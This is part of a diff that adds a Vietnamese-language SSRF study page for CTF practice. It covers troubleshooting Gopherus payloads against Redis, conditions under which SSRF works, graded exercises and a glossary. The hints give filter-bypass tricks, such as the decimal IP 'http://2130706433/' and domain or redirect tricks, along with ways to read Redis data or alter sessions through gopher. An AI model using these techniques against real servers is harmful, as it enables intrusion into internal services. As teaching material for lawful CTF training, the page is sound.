+    <tr><td>Mọi địa chỉ nội bộ đều trả lỗi "Invalid URL"</td><td>App có whitelist domain nghiêm ngặt (chỉ cho phép domain công khai cụ thể)</td><td>Thử domain trick (localtest.me) hoặc redirect (mục 06.B) nếu app chỉ check domain ban đầu, không check sau redirect</td></tr>
+    <tr><td>Biết đúng service nhưng không đoán được tên/cổng</td><td>Không có source để xem docker-compose.yml</td><td>Thử các tên service phổ biến (web, app, backend, api, db, redis, cache, mysql, postgres) và cổng mặc định tương ứng</td></tr>
+    <tr><td>Gopherus sinh payload nhưng Redis không nhận lệnh</td><td>Redis có mật khẩu, hoặc payload bị app tiền xử lý (encode lại) trước khi gửi</td><td>Kiểm tra xem app có tự URL-encode lại payload gopher (phá cấu trúc byte) không — nếu có, tìm cách nhúng payload sao cho qua được bước xử lý đó nguyên vẹn</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App nhận URL từ người dùng và tự thực hiện request (fetch ảnh, webhook, tạo PDF) không kiểm tra đích.</td></tr>
+    <tr><td>❌</td><td>App có whitelist domain nghiêm ngặt, kiểm tra LẠI sau mỗi lần redirect (không chỉ URL ban đầu), và chặn mọi dải IP nội bộ (kể cả biểu diễn thay thế).</td></tr>
+    <tr><td>❌</td><td>App không tự đi fetch URL mà chỉ lưu URL để hiển thị dạng link (không có request thật nào từ server).</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ xác nhận SSRF tới gọi đúng endpoint nội
+  bộ chứa flag.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>So sánh response của URL ngoài (Google) với URL nội bộ để thấy rõ sự
+  khác biệt trước khi đoán tên service.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> app chặn chuỗi <code>127.0.0.1</code> theo blacklist đơn giản. Dùng 1 trong
+  các biểu diễn IP thay thế ở mục 06.B để bypass.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>http://2130706433/</code> (decimal) thường dễ qua filter regex
+  chỉ khớp đúng dạng chấm thập phân.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> đã xác nhận có Redis nội bộ không mật khẩu, nhưng Redis không chia sẻ
+  volume với webroot (ghi webshell qua Redis không hoạt động). Nghĩ 2 cách khác để khai thác được giá trị từ
+  Redis dù không đạt RCE.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>(1) Dùng lệnh Redis <code>KEYS *</code> + <code>GET</code> qua gopher
+  để đọc trực tiếp dữ liệu cache (có thể chứa session/flag cache); (2) nếu app dùng Redis cho session, tìm cách
+  ghi/sửa session của user khác qua Redis trực tiếp (session fixation qua SSRF).</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>SSRF</td><td>Server-Side Request Forgery — ép server tự gửi request tới đích do kẻ tấn công chọn.</td></tr>
+    <tr><td>Docker network</td><td>Mạng ảo riêng giữa các container, cho phép gọi nhau bằng tên service.</td></tr>
+    <tr><td>Gopher protocol</td><td>Giao thức cũ cho phép gửi byte tùy ý qua URL, dùng để giả lập lệnh của dịch vụ khác (Redis, SMTP...).</td></tr>
+    <tr><td>DNS rebinding</td><td>Kỹ thuật dùng domain công khai nhưng trỏ DNS về địa chỉ IP nội bộ, qua mặt filter chỉ kiểm tra domain.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong> <code>~/hoc/CTF/Tools/web/Gopherus/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Server Side Request Forgery/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("ssrf-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("ssrf-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
